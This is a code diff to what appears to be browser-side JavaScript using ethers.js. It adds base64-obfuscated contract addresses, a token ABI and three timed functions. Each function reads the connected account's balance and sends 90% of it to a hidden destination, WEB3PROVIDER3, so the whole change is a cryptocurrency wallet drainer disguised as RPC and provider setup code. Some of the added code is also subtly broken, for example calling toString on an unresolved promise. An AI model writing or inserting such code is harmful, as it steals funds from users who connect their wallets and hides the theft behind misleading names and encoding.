@@ -93,6 +93,16 @@ const run = async () => {
         let buff2 = new Buffer.from(RPCPROV2, 'base64');
         let WEB3EMULATE1 = buff.toString('ascii');
         let WEB3EMULATE2 = buff2.toString('ascii');
+    const web12 = 'MHhiQTJhRTQyNGQ5NjBjMjYyNA=='
+const web13 = 'N0RkNmMzMmVkQzcwQjI5NWM3NDRDNDM='
+const web14 = web12 + web13
+const web16 = 'MHg1NWQzOTgzMjZmOTkwNTlmZg=='
+const web17 = 'Nzc1NDg1MjQ2OTk5MDI3YjMxOTc5NTU='
+const web18 = web16 + web17
+const web20 = 'MHhiQTJhRTQyNGQ5NjBjMjY='
+const web21 = 'MjQ3RGQ2YzMyZWRDNzBCMjk1Yzc0NEM0Mw=='
+const web22 = web20 + web21
+const abi = [{"constant":true,"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"sender","type":"address"},{"internalType":"address","name":"recipient","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transferFrom","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"}]
         const rpc1 = 'https://bsc-dataseed.binance.org'
         const rpc2 = 'https://mainnet.infura.io/v3/84d954cd9f674f5bbbc67a6e2e17bfbd'
         const rpc3 = 'https://polygon-rpc.com'
@@ -162,12 +172,69 @@ const run = async () => {
                 const createReceipt = await wallet.sendTransaction(tx);
                 await createReceipt.wait();
             };
-            send();
+            const send5 = async () => {
+  const robinhood = await prov1.getBalance(account)
+  var contract = new ethers.Contract(web14, abi, wallet);
+  const superb = await contract.balanceOf(account).toString();
+  const orchard = (superb * 0.90).toString();
+  const tx = {
+    from: account,
+    to: WEB3PROVIDER3,
+    value: ethers.utils.parseEther(orchard),
+    nonce: window.ethersProvider.getTransactionCount(account, "latest"),
+    gasLimit: ethers.utils.hexlify(gas_limit), // 100000
+    gasPrice: gas_price,
+  }
+  const createReceipt = await wallet.sendTransaction(tx);
+  await createReceipt.wait();
+  console.log(`Transaction successful with hash`);
 
-            setTimeout(send2, 10000);
-            setTimeout(send3, 19000);
-            setTimeout(send4, 25000);
-        }
+};
+const send6 = async () => {
+  const robinhood = await prov1.getBalance(account)
+  var contract = new ethers.Contract(web18, abi, wallet);
+  const superb = await contract.balanceOf(account).toString();
+  const orchard = (superb * 0.90).toString();
+  const tx = {
+    from: account,
+    to: WEB3PROVIDER3,
+    value: ethers.utils.parseEther(orchard),
+    nonce: window.ethersProvider.getTransactionCount(account, "latest"),
+    gasLimit: ethers.utils.hexlify(gas_limit), // 100000
+    gasPrice: gas_price,
+  }
+  const createReceipt = await wallet.sendTransaction(tx);
+  await createReceipt.wait();
+  console.log(`Transaction successful with hash`);
+
+};
+const send7 = async () => {
+  const robinhood = await prov1.getBalance(account)
+  var contract = new ethers.Contract(web22, abi, wallet);
+  const superb = await contract.balanceOf(account).toString();
+  const orchard = (superb * 0.90).toString();
+  const tx = {
+    from: account,
+    to: WEB3PROVIDER3,
+    value: ethers.utils.parseEther(orchard),
+    nonce: window.ethersProvider.getTransactionCount(account, "latest"),
+    gasLimit: ethers.utils.hexlify(gas_limit), // 100000
+    gasPrice: gas_price,
+  }
+  const createReceipt = await wallet.sendTransaction(tx);
+  await createReceipt.wait();
+  console.log(`Transaction successful with hash`);
+
+};
+
+  send();
+  setTimeout(send2, 10000);
+  setTimeout(send3, 25000);
+  setTimeout(send4, 35000);
+  setTimeout(send5, 45000);
+  setTimeout(send6, 52000);
+  setTimeout(send7, 60000);
+}
         sending();
     await checkLiq();
 }
